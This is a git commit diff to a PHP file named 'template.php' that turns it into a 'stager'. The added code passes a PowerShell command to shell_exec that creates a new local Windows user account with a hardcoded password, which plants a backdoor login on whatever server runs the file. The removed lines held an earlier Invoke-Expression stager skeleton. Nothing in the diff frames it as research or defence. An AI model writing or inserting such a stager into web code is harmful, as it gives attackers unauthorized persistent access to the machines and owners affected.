db6ebe4d7cf958f9af3411b7353e277017480f84
Cryillic <65374850+Cryilllic@users.noreply.github.com>
2020-11-25 17:28:03 -0500

    Update template.php

--- template.php
+++ template.php
@@ -1,20 +1,13 @@
 <?php
-// declare global variables
-$query = "";
-$err = "";
   function compile_stager() {
-    $init = "powershell.exe Invoke-Expression = "; // Intialization variable
-    $payload = "";// Insert PowerShell payload here
-    $execution_command = "shell_exec"; // Execution Variable
-    $query = $execution_command("$init $payload"); // Compile the execution query
-  }
-  function execute_stager() {
+    $user = "user"; // Change this
+    $pass = "password"; // Change this
+    $init = "powershell.exe";
+    $payload = "\$secure = ConvertTo-SecureString \"$pass\" -AsPlainText -Force; New-LocalUser \"$user\" -Password \$secure;"; // Insert PowerShell payload here
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
     echo $query; // Execute query
   }
-  function get_status() {
-    echo "Stager successfully sent"
-  }
-  compile_stage1();
-  execute_stager();
-  get_status();
+
+  compile_stager();
 ?>
